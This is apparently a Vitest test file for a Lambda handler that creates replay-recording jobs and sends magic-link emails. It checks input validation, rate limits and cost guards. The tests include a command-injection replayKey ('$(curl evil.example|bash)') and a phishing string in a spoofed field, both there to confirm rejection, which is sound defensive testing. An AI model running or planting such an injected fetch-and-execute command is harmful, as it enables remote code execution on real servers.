import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { ConditionalCheckFailedException, DynamoDBClient } from "@aws-sdk/client-dynamodb";
import {
  DeleteCommand,
  DynamoDBDocumentClient,
  GetCommand,
  PutCommand,
  ScanCommand,
  UpdateCommand,
} from "@aws-sdk/lib-dynamodb";
import { GetObjectCommand, HeadObjectCommand, S3Client } from "@aws-sdk/client-s3";
import { SendEmailCommand, SESv2Client } from "@aws-sdk/client-sesv2";
import { mockClient } from "aws-sdk-client-mock";
import type { APIGatewayProxyEventV2, APIGatewayProxyStructuredResultV2 } from "aws-lambda";

const FIXTURES_DIR = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../../packages/replay-parser/test-fixtures",
);
const TH07_FIXTURE = path.join(FIXTURES_DIR, "th07/th7_07.rpy");
// th13はパーサーとしては認識できるが、Sattoriの録画対応タイトルには含まれない
// (parseReplay.test.tsと同じ用途)。
const TH13_FIXTURE = path.join(FIXTURES_DIR, "th13/th13_01.rpy");
const TH20_FIXTURE = path.join(FIXTURES_DIR, "th20/th20_01.rpy");

const REQUIRED_ENV: Record<string, string> = {
  UPLOAD_BUCKET: "up-bucket",
  OUTPUT_BUCKET: "out-bucket",
  CDN_DOMAIN: "cdn.example.net",
  JOBS_TABLE: "sattori-jobs",
  WORKER_IMAGE: "123456789012.dkr.ecr.ap-northeast-1.amazonaws.com/sattori-worker:latest",
  TITLE_ASSETS_BUCKET: "title-assets-bucket",
  WORKER_LOG_GROUP: "/sattori/worker",
  WORKER_SUBNET_IDS: "subnet-xxxx,subnet-yyyy",
  WORKER_LAUNCH_TEMPLATE_ID: "lt-xxxx",
  EMAIL_RATE_LIMIT_TABLE: "email-rate-limit",
  SETTINGS_TABLE: "sattori-settings",
  WORKERS_TABLE: "sattori-workers",
  SES_FROM_ADDRESS: "no-reply@sattori.hakatashi.com",
  SES_REPLY_TO_ADDRESS: "reply@example.com",
  SES_CONFIGURATION_SET: "sattori-config-set",
  WEB_BASE_URL: "https://sattori.hakatashi.com",
};

const ddbMock = mockClient(DynamoDBDocumentClient);
const sesMock = mockClient(SESv2Client);
const s3Mock = mockClient(S3Client);

// createPresignedUpload()（`uploads.ts`）が払い出す形式(`REPLAY_KEY_PATTERN`)に
// 合わせたテスト用のキー。SEC-1対応後は入口検証を通らないと202まで到達しない。
const VALID_REPLAY_KEY = "replays/123e4567-e89b-12d3-a456-426614174000.rpy";

function makeEvent(body: unknown): APIGatewayProxyEventV2 {
  return { body: JSON.stringify(body), isBase64Encoded: false } as APIGatewayProxyEventV2;
}

function parseBody(res: APIGatewayProxyStructuredResultV2): unknown {
  return JSON.parse(res.body ?? "{}");
}

function mockUploadedReplay(data: Uint8Array) {
  s3Mock.on(HeadObjectCommand).resolves({ ContentLength: data.byteLength });
  s3Mock.on(GetObjectCommand).resolves({
    Body: { transformToByteArray: async () => data } as never,
  });
}

describe("POST /magic-links", () => {
  beforeEach(() => {
    vi.resetModules();
    ddbMock.reset();
    sesMock.reset();
    s3Mock.reset();
    for (const [key, value] of Object.entries(REQUIRED_ENV)) {
      vi.stubEnv(key, value);
    }
    ddbMock.on(UpdateCommand).resolves({}); // レート制限カウンタの記録
    ddbMock.on(PutCommand).resolves({});
    ddbMock.on(DeleteCommand).resolves({});
    // キルスイッチ設定(GetCommand)は既定で未作成(Item無し)=受付中として扱われる。
    ddbMock.on(GetCommand).resolves({});
    // 月間コストガードの当月コスト算出(adminCosts.tsの全件Scan)は既定でジョブ0件=$0。
    ddbMock.on(ScanCommand).resolves({ Items: [] });
    sesMock.on(SendEmailCommand).resolves({});
    // replayInfoの再パース(Issue #133 OPS-1)用のS3取得。個別のケースで上書きしない限り
    // 「対応するオブジェクトが無い」を既定にし、replayInfoはnullとして扱われる。
    s3Mock.on(HeadObjectCommand).rejects(new Error("NoSuchKey"));
  });

  it("有効な要求ならstatus:pendingのジョブを作成しメールを送信して202を返す", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(202);
    // jobIdはレスポンスに含めない(メールを確認しないと分からない秘密値のため)。
    expect(parseBody(result)).toEqual({});

    const putCalls = ddbMock.commandCalls(PutCommand); // job(pending)
    expect(putCalls).toHaveLength(1);
    const jobPut = putCalls.find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item).toMatchObject({
      status: "pending",
      email: "user@example.com",
      replayKey: VALID_REPLAY_KEY,
      language: "ja", // 未指定時は既定言語(ja)
    });
    expect(jobPut?.args[0].input.ConditionExpression).toBe("attribute_not_exists(jobId)");

    const sendCalls = sesMock.commandCalls(SendEmailCommand);
    expect(sendCalls).toHaveLength(1);
    expect(sendCalls[0]?.args[0].input.Destination?.ToAddresses).toEqual(["user@example.com"]);
    // メール本文にジョブページ(/jobs/{jobId})へのリンクは含むが、token相当のパラメータは含まない。
    const emailBody = sendCalls[0]?.args[0].input.Content?.Simple?.Body?.Text?.Data ?? "";
    expect(emailBody).toContain(`/jobs/${jobPut?.args[0].input.Item?.jobId}`);
    expect(emailBody).not.toContain("token=");
  });

  it("language: enを指定すればジョブに保存し、英語の文面・/enリンクでメールを送る", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
        language: "en",
      }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);

    const putCalls = ddbMock.commandCalls(PutCommand);
    const jobPut = putCalls.find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.language).toBe("en");

    const sendCalls = sesMock.commandCalls(SendEmailCommand);
    expect(sendCalls[0]?.args[0].input.Content?.Simple?.Subject?.Data).not.toMatch(/録画/);
    const emailBody = sendCalls[0]?.args[0].input.Content?.Simple?.Body?.Text?.Data ?? "";
    expect(emailBody).toContain(`/en/jobs/${jobPut?.args[0].input.Item?.jobId}`);
  });

  it("不正なlanguageが渡されれば既定言語(ja)にフォールバックする", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
        language: "fr",
      }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);

    const putCalls = ddbMock.commandCalls(PutCommand);
    const jobPut = putCalls.find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.language).toBe("ja");
  });

  it("replayKeyの.rpyをサーバー側で再パースしてジョブレコード・メール本文に反映し、クライアントが送ったreplayInfoは無視する（Issue #133 OPS-1）", async () => {
    mockUploadedReplay(new Uint8Array(await readFile(TH07_FIXTURE)));
    const { handler } = await import("./requestMagicLink.js");
    // 第三者への嫌がらせ・フィッシング文面の注入を試みる悪意あるクライアント値。
    // 再パース方式ではこの値は一切使われない。
    const spoofedReplayInfo = {
      game: "th07" as const,
      player: "click http://evil.example now",
      date: null,
      character: null,
      difficulty: null,
      stage: null,
      score: null,
      cleared: null,
      estimatedDurationSeconds: null,
    };
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
        replayInfo: spoofedReplayInfo,
      }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);

    const putCalls = ddbMock.commandCalls(PutCommand);
    const jobPut = putCalls.find((call) => call.args[0].input.Item?.status === "pending");
    // th7_07.rpy の実データ(parseReplay.test.tsと同じ検証値)。クライアントが送った
    // spoofedReplayInfoではなく、.rpyから再パースした値が入っていること。
    expect(jobPut?.args[0].input.Item?.replayInfo).toMatchObject({
      game: "th07",
      character: "MarisaA",
      difficulty: "Extra",
      score: 303766040,
      cleared: true,
    });
    // game/estimatedDurationSeconds自体もリクエストボディでは受け取らず、
    // 同じ再パース結果からのみ決まる。
    expect(jobPut?.args[0].input.Item?.game).toBe("th07");
    expect(jobPut?.args[0].input.Item?.estimatedDurationSeconds).toBe(847);

    const sendCalls = sesMock.commandCalls(SendEmailCommand);
    const emailBody = sendCalls[0]?.args[0].input.Content?.Simple?.Body?.Text?.Data ?? "";
    expect(emailBody).toContain("【作品タイトル】東方妖々夢 ～ Perfect Cherry Blossom.");
    expect(emailBody).not.toContain("evil.example");
    expect(sendCalls[0]?.args[0].input.ConfigurationSetName).toBe("sattori-config-set");
  });

  it("リプレイの取得・解析に失敗してもreplayInfoをnullとしてジョブ作成・メール送信を継続する", async () => {
    // beforeEachの既定(HeadObjectCommandがreject)がそのまま「取得失敗」のケースになる。
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);

    const putCalls = ddbMock.commandCalls(PutCommand);
    const jobPut = putCalls.find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.replayInfo).toBeNull();
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(1);
  });

  it("email の形式が不正なら400を返しメールを送らない", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({ replayKey: VALID_REPLAY_KEY, options: { watermark: true }, email: "not-an-email" }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(400);
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
  });

  it("replayKey が無ければ400を返す", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({ options: { watermark: true }, email: "user@example.com" }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(400);
  });

  it("replayKey がサーバー採番の形式(replays/<uuid>.rpy)でなければ400を返しメールを送らない（Issue #127 SEC-1）", async () => {
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: "replays/x.rpy$(curl evil.example|bash)",
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(400);
    expect(parseBody(result)).toMatchObject({ code: "invalid_replay_key" });
    expect(ddbMock.commandCalls(PutCommand)).toHaveLength(0);
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
  });

  it("再パースに失敗した.rpyでも(タイトル自体は不明なため)th07を既定として受け付ける", async () => {
    // beforeEachの既定(HeadObjectCommandがreject)がそのまま「取得失敗」のケースになる。
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(202);
    const jobPut = ddbMock
      .commandCalls(PutCommand)
      .find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.game).toBe("th07");
    expect(jobPut?.args[0].input.Item?.estimatedDurationSeconds).toBeNull();
  });

  it("実体が録画未対応タイトルなら422を返す(game/estimatedDurationSecondsはクライアントから受け取らず.rpyの再パース結果のみで決まる、Issue #133 OPS-1)", async () => {
    // job.gameはEC2インスタンスタイプ選定(ec2.tsのgetCandidateInstanceTypes())を
    // 直接左右するため、クライアントに申告させず.rpyの実体から検出する。
    mockUploadedReplay(new Uint8Array(await readFile(TH13_FIXTURE)));
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(422);
    expect(parseBody(result)).toMatchObject({ code: "unsupported_game" });
    expect(ddbMock.commandCalls(PutCommand)).toHaveLength(0);
  });

  it("低速録画に対応したタイトル(th20)の.rpyなら options.slowMotion をそのまま保存する", async () => {
    mockUploadedReplay(new Uint8Array(await readFile(TH20_FIXTURE)));
    const { handler } = await import("./requestMagicLink.js");
    await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true, slowMotion: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const jobPut = ddbMock
      .commandCalls(PutCommand)
      .find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.game).toBe("th20");
    expect(jobPut?.args[0].input.Item?.options).toMatchObject({ slowMotion: true });
  });

  it("低速録画に未対応のタイトル(th07)の.rpyなら options.slowMotion を握り潰す(Issue #101)", async () => {
    // 等倍で動くゲームに後処理の等倍化だけが掛かると2倍速の動画が出来上がるため、
    // ページAのグレーアウトをすり抜けた要求はここで落とす(録画自体は等倍で行える
    // のでエラーにはしない)。
    mockUploadedReplay(new Uint8Array(await readFile(TH07_FIXTURE)));
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true, slowMotion: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    expect((res as APIGatewayProxyStructuredResultV2).statusCode).toBe(202);
    const jobPut = ddbMock
      .commandCalls(PutCommand)
      .find((call) => call.args[0].input.Item?.status === "pending");
    expect(jobPut?.args[0].input.Item?.options).toMatchObject({ slowMotion: false });
  });

  it("レート制限に達していれば429を返しメールを送らない", async () => {
    ddbMock.on(UpdateCommand).rejects(
      new ConditionalCheckFailedException({ message: "condition failed", $metadata: {} }),
    );
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(429);
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
  });

  it("ジョブレコードの作成に失敗すれば500を返しメールを送らない", async () => {
    ddbMock.on(PutCommand).rejects(new Error("DynamoDB unavailable"));
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(500);
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
  });

  it("メール送信に失敗すれば502を返し、作成済みのジョブを削除する", async () => {
    sesMock.on(SendEmailCommand).rejects(new Error("SES unavailable"));
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(502);

    const putCalls = ddbMock.commandCalls(PutCommand);
    const deleteCalls = ddbMock.commandCalls(DeleteCommand);
    expect(deleteCalls).toHaveLength(1);
    expect(deleteCalls[0]?.args[0].input.Key).toEqual({
      jobId: putCalls[0]?.args[0].input.Item?.jobId,
    });
  });

  it("キルスイッチが停止中(acceptingNewJobs:false)なら503を返し、メール送信もレート制限の消費もしない(Issue #14)", async () => {
    ddbMock
      .on(GetCommand)
      .resolves({ Item: { settingKey: "global", acceptingNewJobs: false, monthlyCostLimitUsd: 50 } });
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(503);
    expect(parseBody(result)).toMatchObject({ code: "service_paused" });
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
    expect(ddbMock.commandCalls(PutCommand)).toHaveLength(0);
    expect(ddbMock.commandCalls(UpdateCommand)).toHaveLength(0);
  });

  it("当月の推定コストが月間上限額に達していれば503を返し、メールを送らない(Issue #14)", async () => {
    ddbMock
      .on(GetCommand)
      .resolves({ Item: { settingKey: "global", acceptingNewJobs: true, monthlyCostLimitUsd: 0.0001 } });
    const now = new Date();
    ddbMock.on(ScanCommand).resolves({
      Items: [
        {
          status: "done",
          game: "th07",
          createdAt: now.toISOString(),
          updatedAt: now.toISOString(),
          launchedAt: null,
          doneAt: null,
          instanceId: null,
          instanceType: null,
          spotPricePerHour: null,
          outputPath: null,
          outputPath720p: null,
          outputBytes: null,
          outputBytes720p: null,
        },
      ],
    });
    const { handler } = await import("./requestMagicLink.js");
    const res = await handler(
      makeEvent({
        replayKey: VALID_REPLAY_KEY,
        options: { watermark: true },
        email: "user@example.com",
      }),
      {} as never,
      () => {},
    );
    const result = res as APIGatewayProxyStructuredResultV2;
    expect(result.statusCode).toBe(503);
    expect(parseBody(result)).toMatchObject({ code: "monthly_cost_limit_reached" });
    expect(sesMock.commandCalls(SendEmailCommand)).toHaveLength(0);
  });
});
